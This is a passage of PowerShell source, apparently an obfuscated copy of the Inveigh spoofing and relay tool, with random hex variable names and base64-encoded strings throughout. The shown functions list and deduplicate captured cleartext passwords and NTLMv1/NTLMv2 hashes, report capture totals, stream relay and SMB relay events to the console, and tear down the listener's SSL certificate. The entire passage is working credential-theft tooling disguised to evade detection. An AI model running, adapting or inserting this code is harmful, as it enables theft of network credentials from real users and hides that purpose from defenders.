            ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAcgBlACAAYQByAGUAIABuAG8AIAByAHUAbgBuAGkAbgBnACAASQBuAHYAZQBpAGcAaAAgAGYAdQBuAGMAdABpAG8AbgBzAA==')))) | Out-Null
        }
        if(${5caffc5f8dd440f7b05ff021bfd90d19}.HTTPS)
        {
            & $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAcwBoAA=='))) http delete sslcert ipport=0.0.0.0:443 > $null
            try
            {
                ${a7ce9d7a8c0c41b6970e5ed6c9d0651f} = New-Object System.Security.Cryptography.X509Certificates.X509Store("My",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAE0AYQBjAGgAaQBuAGUA'))))
                ${a7ce9d7a8c0c41b6970e5ed6c9d0651f}.Open($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABXAHIAaQB0AGUA'))))
                ${daf91e19890241899c12442e8e2bfbc5} = ${a7ce9d7a8c0c41b6970e5ed6c9d0651f}.certificates.find($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABCAHkAVABoAHUAbQBiAHAAcgBpAG4AdAA='))),${5caffc5f8dd440f7b05ff021bfd90d19}.certificate_thumbprint,$FALSE)[0]
                ${a7ce9d7a8c0c41b6970e5ed6c9d0651f}.Remove(${daf91e19890241899c12442e8e2bfbc5})
                ${a7ce9d7a8c0c41b6970e5ed6c9d0651f}.Close()
            }
            catch
            {
                ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAEwAIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABEAGUAbABlAHQAaQBvAG4AIABFAHIAcgBvAHIAIAAtACAAUgBlAG0AbwB2AGUAIABNAGEAbgB1AGEAbABsAHkA'))))|Out-Null
                ${5caffc5f8dd440f7b05ff021bfd90d19}.log.add("$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually")|Out-Null
                if(${5caffc5f8dd440f7b05ff021bfd90d19}.file_output)
                {
                    "$(Get-Date -format 's') - SSL Certificate Deletion Error - Remove Manually"|Out-File ${5caffc5f8dd440f7b05ff021bfd90d19}.log_out_file -Append   
                }
            }
        }
        ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTP = $false
        ${5caffc5f8dd440f7b05ff021bfd90d19}.HTTPS = $false
    }
    else
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAcgBlACAAYQByAGUAIABuAG8AIAByAHUAbgBuAGkAbgBnACAASQBuAHYAZQBpAGcAaAAgAGYAdQBuAGMAdABpAG8AbgBzAA=='))))|Out-Null
    }
    if(${5caffc5f8dd440f7b05ff021bfd90d19}.status_output)
    {
        while(${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.Count -gt 0)
        {
            if(${5caffc5f8dd440f7b05ff021bfd90d19}.output_stream_only)
            {
                write-output(${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue[0] + ${5caffc5f8dd440f7b05ff021bfd90d19}.newline)
                ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.RemoveRange(0,1)
            }
            else
            {
                switch -wildcard (${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue[0])
                {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgACoAZQB4AGkAdABlAGQAIAAqAA==')))
                    {
                        write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue[0]
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.RemoveRange(0,1)
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBTAEwAIABDAGUAcgB0AGkAZgBpAGMAYQB0AGUAIABEAGUAbABlAHQAaQBvAG4AIABFAHIAcgBvAHIAIAAtACAAUgBlAG0AbwB2AGUAIABNAGEAbgB1AGEAbABsAHkA')))
                    {
                        write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue[0]
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.RemoveRange(0,1)
                    }
                    default
                    {
                        write-output ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue[0]
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.status_queue.RemoveRange(0,1)
                    }
                } 
            }   
        }
    }
} 
Function Get-Inveigh
{
    while(${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.Count -gt 0)
    {
        if(${5caffc5f8dd440f7b05ff021bfd90d19}.output_stream_only)
        {
            write-output(${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0] + ${5caffc5f8dd440f7b05ff021bfd90d19}.newline)
            ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
        }
        else
        {
            switch -wildcard (${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0])
            {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgACoAZQB4AGkAdABlAGQAIAAqAA==')))
                {
                    write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHcAcgBpAHQAdABlAG4AIAB0AG8AIAAqAA==')))
                {
                    if(${5caffc5f8dd440f7b05ff021bfd90d19}.file_output)
                    {
                        write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                    }
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGYAbwByACAAcgBlAGwAYQB5ACAAKgA=')))
                {
                    write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBTAE0AQgAgAHIAZQBsAGEAeQAgACoA')))
                {
                    write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIAAqAA==')))
                {
                    write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                }
                default
                {
                    write-output ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                }
            }
        }    
    }
}
Function Get-InveighCleartext
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_list
}
Function Get-InveighNTLM
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_list
    ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_list
}
Function Get-InveighNTLMv1
{
    param
    ( 
        [parameter(Mandatory=$false)][switch]${a2c179a1700043cb8e0d2d10881dd45b},
        [parameter(ValueFromRemainingArguments=$true)] ${b1e0501fed684d39aab04d7513ff44f6}
    )
    if (${b1e0501fed684d39aab04d7513ff44f6})
    {
        throw "$(${b1e0501fed684d39aab04d7513ff44f6}) is not a valid parameter."
    }
    if(${a2c179a1700043cb8e0d2d10881dd45b})
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_list.sort()
        ForEach($unique_NTLMv1 in ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_list)
        {
            ${45bb5a9bc9ff49f7950e6bca86e1133c} = $unique_NTLMv1.substring(0,$unique_NTLMv1.indexof(":",($unique_NTLMv1.indexof(":")+2)))
            if(${45bb5a9bc9ff49f7950e6bca86e1133c} -ne ${adb4ab354efc4c788be4b7cf4d847ab3})
            {
                $unique_NTLMv1
            }
            ${adb4ab354efc4c788be4b7cf4d847ab3} = ${45bb5a9bc9ff49f7950e6bca86e1133c}
        }
    }
    else
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_list
    }
}
Function Get-InveighNTLMv2
{
    param
    ( 
        [parameter(Mandatory=$false)][switch]${a2c179a1700043cb8e0d2d10881dd45b},
        [parameter(ValueFromRemainingArguments=$true)] ${b1e0501fed684d39aab04d7513ff44f6}
    )
    if (${b1e0501fed684d39aab04d7513ff44f6})
    {
        throw "$(${b1e0501fed684d39aab04d7513ff44f6}) is not a valid parameter."
    }
    if(${a2c179a1700043cb8e0d2d10881dd45b})
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_list.sort()
        ForEach($unique_NTLMv2 in ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_list)
        {
            ${076e0d3d5beb41b881d17550bce296cf} = $unique_NTLMv2.substring(0,$unique_NTLMv2.indexof(":",($unique_NTLMv2.indexof(":")+2)))
            if(${076e0d3d5beb41b881d17550bce296cf} -ne ${11a1607f1ad64579a3a25b07d031fcee})
            {
                $unique_NTLMv2
            }
            ${11a1607f1ad64579a3a25b07d031fcee} = ${076e0d3d5beb41b881d17550bce296cf}
        }
    }
    else
    {
        ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_list
    }
}
Function Get-InveighLog
{
    ${5caffc5f8dd440f7b05ff021bfd90d19}.log
}
Function Get-InveighStat
{
    echo($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAHQAYQBsACAAQwBsAGUAYQByAHQAZQB4AHQAIABDAGEAcAB0AHUAcgBlAHMAIAA9ACAA'))) + ${5caffc5f8dd440f7b05ff021bfd90d19}.cleartext_list.count)
    echo($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAHQAYQBsACAATgBUAEwATQB2ADEAIABDAGEAcAB0AHUAcgBlAHMAIAA9ACAA'))) + ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv1_list.count)
    echo($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAHQAYQBsACAATgBUAEwATQB2ADIAIABDAGEAcAB0AHUAcgBlAHMAIAA9ACAA'))) + ${5caffc5f8dd440f7b05ff021bfd90d19}.NTLMv2_list.count)
}
Function Watch-Inveigh
{
    if(${5caffc5f8dd440f7b05ff021bfd90d19}.tool -ne 1)
    {
        if(${5caffc5f8dd440f7b05ff021bfd90d19}.running -or ${5caffc5f8dd440f7b05ff021bfd90d19}.relay_running -or ${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running)
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAcwBzACAAYQBuAHkAIABrAGUAeQAgAHQAbwAgAHMAdABvAHAAIAByAGUAYQBsACAAdABpAG0AZQAgAGMAbwBuAHMAbwBsAGUAIABvAHUAdABwAHUAdAA=')))
            ${5caffc5f8dd440f7b05ff021bfd90d19}.console_output = $true
            :console_loop while(((${5caffc5f8dd440f7b05ff021bfd90d19}.running -or ${5caffc5f8dd440f7b05ff021bfd90d19}.relay_running -or ${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running) -and ${5caffc5f8dd440f7b05ff021bfd90d19}.console_output) -or (${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.Count -gt 0 -and ${5caffc5f8dd440f7b05ff021bfd90d19}.console_output))
            {
                while(${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.Count -gt 0)
                {
                    if(${5caffc5f8dd440f7b05ff021bfd90d19}.output_stream_only)
                    {
                        write-output(${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0] + ${5caffc5f8dd440f7b05ff021bfd90d19}.newline)
                        ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                    }
                    else
                    {
                        switch -wildcard (${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0])
                        {  
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgACoAZQB4AGkAdABlAGQAIAAqAA==')))
                            {
                                write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                                ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAHcAcgBpAHQAdABlAG4AIAB0AG8AIAAqAA==')))
                            {
                                if(${5caffc5f8dd440f7b05ff021bfd90d19}.file_output)
                                {
                                    write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                                }
                                ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGYAbwByACAAcgBlAGwAYQB5ACAAKgA=')))
                            {
                                write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                                ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBTAE0AQgAgAHIAZQBsAGEAeQAgACoA')))
                            {
                                write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                                ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAgAGwAbwBjAGEAbAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIAAqAA==')))
                            {
                                write-warning ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                                ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                            }
                            default
                            {
                                write-output ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue[0]
                                ${5caffc5f8dd440f7b05ff021bfd90d19}.console_queue.RemoveRange(0,1)
                            }
                        }
                    }            
                }
                if([console]::KeyAvailable)
                {
                    ${5caffc5f8dd440f7b05ff021bfd90d19}.console_output = $false
                    BREAK console_loop
                }
                sleep -m 5
            }
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgAGkAcwBuACcAdAAgAHIAdQBuAG4AaQBuAGcA')))
        }
    }
    else
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBhAHQAYwBoAC0ASQBuAHYAZQBpAGcAaAAgAGMAYQBuAG4AbwB0ACAAYgBlACAAdQBzAGUAZAAgAHcAaQB0AGgAIABjAHUAcgByAGUAbgB0ACAAZQB4AHQAZQByAG4AYQBsACAAdABvAG8AbAAgAHMAZQBsAGUAYwB0AGkAbwBuAA==')))
    }
}
Function Clear-Inveigh
{
    if(${5caffc5f8dd440f7b05ff021bfd90d19})
    {
        if(!${5caffc5f8dd440f7b05ff021bfd90d19}.running -and !${5caffc5f8dd440f7b05ff021bfd90d19}.relay_running -and !${5caffc5f8dd440f7b05ff021bfd90d19}.bruteforce_running)
        {
            rv inveigh -scope global
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAZQBpAGcAaAAgAGQAYQB0AGEAIABoAGEAcwAgAGIAZQBlAG4AIABjAGwAZQBhAHIAZQBkACAAZgByAG8AbQAgAG0AZQBtAG8AcgB5AA==')))
        }
        else
        {
            echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABTAHQAbwBwAC0ASQBuAHYAZQBpAGcAaAAgAGIAZQBmAG8AcgBlACAAcgB1AG4AbgBpAG4AZwAgAEMAbABlAGEAcgAtAEkAbgB2AGUAaQBnAGgA')))
        }
    }
}
